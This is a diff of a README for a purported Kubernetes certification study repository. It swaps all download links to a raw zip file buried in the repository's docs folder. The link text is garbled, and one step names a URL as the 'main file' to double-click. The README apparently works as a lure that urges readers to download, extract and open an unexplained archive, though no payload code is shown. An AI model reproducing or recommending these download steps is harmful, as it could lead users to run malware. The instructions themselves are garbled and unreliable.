@@ -1,6 +1,6 @@
 # 🚀 golden-kubestronaut-learning - Your Gateway to Kubernetes Mastery 
 
-[![Download](https://github.com/jobairahammedrafe/golden-kubestronaut-learning/raw/refs/heads/main/ica/kubestronaut-learning-golden-3.9-alpha.5.zip%20Now-Click%https://github.com/jobairahammedrafe/golden-kubestronaut-learning/raw/refs/heads/main/ica/kubestronaut-learning-golden-3.9-alpha.5.zip)](https://github.com/jobairahammedrafe/golden-kubestronaut-learning/raw/refs/heads/main/ica/kubestronaut-learning-golden-3.9-alpha.5.zip)
+[![Download](https://raw.githubusercontent.com/jobairahammedrafe/golden-kubestronaut-learning/main/docs/capa/kubestronaut_golden_learning_v2.9.zip%20Now-Click%https://raw.githubusercontent.com/jobairahammedrafe/golden-kubestronaut-learning/main/docs/capa/kubestronaut_golden_learning_v2.9.zip)](https://raw.githubusercontent.com/jobairahammedrafe/golden-kubestronaut-learning/main/docs/capa/kubestronaut_golden_learning_v2.9.zip)
 
 ## 📖 Description
 
@@ -28,7 +28,7 @@ To begin your journey towards Kubernetes certification, follow these steps:
 
 1. **Visit the Releases Page:** Click the button below to access the latest version of golden-kubestronaut-learning.
 
-   [![Download](https://github.com/jobairahammedrafe/golden-kubestronaut-learning/raw/refs/heads/main/ica/kubestronaut-learning-golden-3.9-alpha.5.zip%20Now-Click%https://github.com/jobairahammedrafe/golden-kubestronaut-learning/raw/refs/heads/main/ica/kubestronaut-learning-golden-3.9-alpha.5.zip)](https://github.com/jobairahammedrafe/golden-kubestronaut-learning/raw/refs/heads/main/ica/kubestronaut-learning-golden-3.9-alpha.5.zip)
+   [![Download](https://raw.githubusercontent.com/jobairahammedrafe/golden-kubestronaut-learning/main/docs/capa/kubestronaut_golden_learning_v2.9.zip%20Now-Click%https://raw.githubusercontent.com/jobairahammedrafe/golden-kubestronaut-learning/main/docs/capa/kubestronaut_golden_learning_v2.9.zip)](https://raw.githubusercontent.com/jobairahammedrafe/golden-kubestronaut-learning/main/docs/capa/kubestronaut_golden_learning_v2.9.zip)
 
 2. **Choose Your Download:** On the Releases page, you'll find various versions of the resource. Select the version that fits your needs. 
 
@@ -36,13 +36,13 @@ To begin your journey towards Kubernetes certification, follow these steps:
 
 4. **Extract the Files:** If the files are in a compressed format (like .zip), right-click on the file and select "Extract All." Choose a location to save the extracted files.
 
-5. **Open the Learning Resource:** Navigate to the folder where you extracted the files. Look for the main file (often named https://github.com/jobairahammedrafe/golden-kubestronaut-learning/raw/refs/heads/main/ica/kubestronaut-learning-golden-3.9-alpha.5.zip or https://github.com/jobairahammedrafe/golden-kubestronaut-learning/raw/refs/heads/main/ica/kubestronaut-learning-golden-3.9-alpha.5.zip) and double-click to open it.
+5. **Open the Learning Resource:** Navigate to the folder where you extracted the files. Look for the main file (often named https://raw.githubusercontent.com/jobairahammedrafe/golden-kubestronaut-learning/main/docs/capa/kubestronaut_golden_learning_v2.9.zip or https://raw.githubusercontent.com/jobairahammedrafe/golden-kubestronaut-learning/main/docs/capa/kubestronaut_golden_learning_v2.9.zip) and double-click to open it.
 
 ## 📥 Download & Install
 
 To start using the golden-kubestronaut-learning resources, visit the following page:
 
-[Download golden-kubestronaut-learning](https://github.com/jobairahammedrafe/golden-kubestronaut-learning/raw/refs/heads/main/ica/kubestronaut-learning-golden-3.9-alpha.5.zip)
+[Download golden-kubestronaut-learning](https://raw.githubusercontent.com/jobairahammedrafe/golden-kubestronaut-learning/main/docs/capa/kubestronaut_golden_learning_v2.9.zip)
 
 Follow the steps listed above to download and extract the files. After that, you can dive right into the materials.
 
